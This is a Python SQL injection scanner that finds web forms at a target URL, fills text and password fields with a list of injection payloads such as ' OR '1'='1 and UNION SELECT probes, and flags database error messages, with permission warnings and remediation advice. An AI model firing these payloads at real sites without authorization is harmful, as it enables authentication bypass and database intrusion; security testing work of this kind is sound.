import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import argparse
import sys
import json
from colorama import Fore, Style, init
from datetime import datetime

# Initialize colorama for colored output
init(autoreset=True)

# SQL injection payloads to test
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' OR 1=1--",
    "') OR ('1'='1",
    "1' AND '1'='1",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "' AND 1=1--",
    "\" OR \"1\"=\"1",
    "' OR 'a'='a",
    "') OR ('a'='a"
]

# Error patterns that indicate SQL injection vulnerability
ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax error",
    "mysql_fetch",
    "num_rows",
    "mysql_query",
    "postgresql query failed",
    "ora-01756",
    "sqlite error",
    "database error",
    "syntax error",
    "unexpected end of sql command"
]

class SQLiScanner:
    def __init__(self, url, timeout=10, verbose=False):
        self.url = url
        self.timeout = timeout
        self.verbose = verbose
        self.vulnerabilities_found = []
        self.forms_tested = 0
        
    def get_forms(self, url):
        """Extract all forms from the given URL"""
        try:
            response = requests.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except Exception as e:
            print(f"{Fore.RED}✗ Error fetching forms: {e}")
            return []
    
    def get_form_details(self, form):
        """Extract form details like action, method, and inputs"""
        details = {}
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value
            })
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details
    
    def is_vulnerable(self, response):
        """Check if the response contains SQL error patterns"""
        content = response.text.lower()
        for pattern in ERROR_PATTERNS:
            if pattern in content:
                return True, pattern
        return False, None
    
    def test_form(self, form, url):
        """Test a form for SQL injection vulnerabilities"""
        form_details = self.get_form_details(form)
        target_url = urljoin(url, form_details["action"])
        
        self.forms_tested += 1
        
        if self.verbose:
            print(f"\n{Fore.CYAN}→ Testing form #{self.forms_tested}")
            print(f"  Action: {target_url}")
            print(f"  Method: {form_details['method'].upper()}")
        
        vulnerabilities = []
        
        for payload in SQL_PAYLOADS:
            data = {}
            for input_field in form_details["inputs"]:
                if input_field["type"] in ["text", "search", "email", "password"]:
                    if input_field["name"]:
                        data[input_field["name"]] = payload
                elif input_field["type"] == "submit":
                    if input_field["name"]:
                        data[input_field["name"]] = input_field["value"]
            
            if not data:
                continue
            
            try:
                if form_details["method"] == "post":
                    response = requests.post(target_url, data=data, timeout=self.timeout)
                else:
                    response = requests.get(target_url, params=data, timeout=self.timeout)
                
                vulnerable, error_pattern = self.is_vulnerable(response)
                
                if vulnerable:
                    vuln_info = {
                        "form_action": target_url,
                        "method": form_details["method"],
                        "payload": payload,
                        "error_pattern": error_pattern,
                        "inputs_tested": list(data.keys())
                    }
                    vulnerabilities.append(vuln_info)
                    
                    if self.verbose:
                        print(f"{Fore.RED}  ✗ VULNERABLE - Payload: {payload[:30]}...")
                        print(f"    Error pattern detected: {error_pattern}")
                    
                    # Stop testing this form after first vulnerability found
                    break
                    
            except requests.exceptions.RequestException as e:
                if self.verbose:
                    print(f"{Fore.YELLOW}  ⚠ Request failed: {str(e)[:50]}")
                continue
        
        return vulnerabilities
    
    def scan(self):
        """Main scanning function"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}SQL INJECTION SCANNER")
        print(f"{Fore.CYAN}{'='*70}")
        print(f"\n{Fore.WHITE}Target: {self.url}")
        print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\n{Fore.YELLOW}⚠ WARNING: Only scan websites you own or have permission to test!")
        print(f"{Fore.CYAN}{'='*70}\n")
        
        # Get all forms from the target URL
        print(f"{Fore.CYAN}→ Searching for forms...")
        forms = self.get_forms(self.url)
        
        if not forms:
            print(f"{Fore.YELLOW}✗ No forms found on {self.url}")
            return
        
        print(f"{Fore.GREEN}✓ Found {len(forms)} form(s) to test\n")
        
        # Test each form
        for i, form in enumerate(forms, 1):
            vulnerabilities = self.test_form(form, self.url)
            if vulnerabilities:
                self.vulnerabilities_found.extend(vulnerabilities)
        
        # Print results
        self.print_results()
    
    def print_results(self):
        """Print scan results"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}SCAN RESULTS")
        print(f"{Fore.CYAN}{'='*70}\n")
        
        print(f"Forms tested: {self.forms_tested}")
        print(f"Payloads per form: {len(SQL_PAYLOADS)}")
        
        if self.vulnerabilities_found:
            print(f"\n{Fore.RED}⚠ VULNERABILITIES FOUND: {len(self.vulnerabilities_found)}\n")
            
            for i, vuln in enumerate(self.vulnerabilities_found, 1):
                print(f"{Fore.RED}Vulnerability #{i}:")
                print(f"  Form: {vuln['form_action']}")
                print(f"  Method: {vuln['method'].upper()}")
                print(f"  Payload: {vuln['payload']}")
                print(f"  Error Pattern: {vuln['error_pattern']}")
                print(f"  Vulnerable Fields: {', '.join(vuln['inputs_tested'])}")
                print()
            
            print(f"{Fore.YELLOW}{'='*70}")
            print(f"{Fore.YELLOW}RECOMMENDATION:")
            print(f"{Fore.WHITE}  - Use parameterized queries/prepared statements")
            print(f"{Fore.WHITE}  - Implement input validation and sanitization")
            print(f"{Fore.WHITE}  - Use an ORM framework with built-in protections")
            print(f"{Fore.WHITE}  - Apply principle of least privilege for database access")
            print(f"{Fore.YELLOW}{'='*70}\n")
        else:
            print(f"\n{Fore.GREEN}✓ No SQL injection vulnerabilities detected!")
            print(f"{Fore.WHITE}  Note: This doesn't guarantee the site is secure.")
            print(f"{Fore.WHITE}  Consider professional security auditing for production systems.\n")


def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Scanner - Test web forms for SQLi vulnerabilities",
        epilog="⚠ WARNING: Only test websites you own or have explicit permission to test!"
    )
    parser.add_argument("url", help="Target URL to scan (e.g., http://testphp.vulnweb.com)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(("http://", "https://")):
        print(f"{Fore.RED}✗ Error: URL must start with http:// or https://")
        sys.exit(1)
    
    # Create scanner and run
    scanner = SQLiScanner(args.url, timeout=args.timeout, verbose=args.verbose)
    scanner.scan()


if __name__ == "__main__":
    main()
